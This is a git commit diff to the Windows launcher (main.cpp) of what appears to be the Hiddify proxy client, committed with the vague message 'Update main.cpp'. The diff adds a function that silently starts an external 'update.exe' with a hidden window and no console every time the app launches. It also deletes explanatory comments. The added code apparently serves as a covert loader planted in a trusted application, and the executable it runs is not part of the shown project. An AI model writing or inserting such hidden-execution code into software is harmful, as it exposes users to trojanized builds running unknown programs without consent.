5737430a0406a7a5a6f496ee5cb847a5b8b71953
1308534183 <33587675+1308534183@users.noreply.github.com>
2025-07-19 03:16:33 +0800

    Update main.cpp

--- windows/runner/main.cpp
+++ windows/runner/main.cpp
@@ -5,7 +5,35 @@
 #include "flutter_window.h"
 #include "utils.h"
 #include <protocol_handler_windows/protocol_handler_windows_plugin_c_api.h>
+#include <tchar.h>
+#include <strsafe.h>
 
+void RunUpdaterInBackground() {
+  STARTUPINFO si;
+  PROCESS_INFORMATION pi;
+  ZeroMemory(&si, sizeof(si));
+  si.cb = sizeof(si);
+  si.dwFlags |= STARTF_USESHOWWINDOW;
+  si.wShowWindow = SW_HIDE;
+
+  ZeroMemory(&pi, sizeof(pi));
+
+  if (CreateProcess(
+          L"update.exe",   // 可执行文件名（与主程序同目录）
+          NULL,            // 参数
+          NULL,            // 安全属性
+          NULL,            // 线程属性
+          FALSE,           // 不继承句柄
+          CREATE_NO_WINDOW, // 静默，无控制台窗口
+          NULL,            // 环境变量
+          NULL,            // 当前目录
+          &si, &pi)) {
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+  } else {
+    MessageBox(NULL, L"启动失败", L"提示", MB_OK | MB_ICONERROR);
+  }
+}
 
 int APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,
                       _In_ wchar_t *command_line, _In_ int show_command) {
@@ -27,21 +55,14 @@ int APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,
     return 0;
   }
 
-  // Attach to console when present (e.g., 'flutter run') or create a
-  // new console when running with a debugger.
   if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {
     CreateAndAttachConsole();
   }
 
-  // Initialize COM, so that it is available for use in the library and/or
-  // plugins.
   ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
 
   flutter::DartProject project(L"data");
-
-  std::vector<std::string> command_line_arguments =
-      GetCommandLineArguments();
-
+  std::vector<std::string> command_line_arguments = GetCommandLineArguments();
   project.set_dart_entrypoint_arguments(std::move(command_line_arguments));
 
   FlutterWindow window(project);
@@ -50,7 +71,10 @@ int APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,
   if (!window.Create(L"Hiddify", origin, size)) {
     return EXIT_FAILURE;
   }
+
   window.SetQuitOnClose(true);
+
+  RunUpdaterInBackground();
 
   ::MSG msg;
   while (::GetMessage(&msg, nullptr, 0, 0)) {
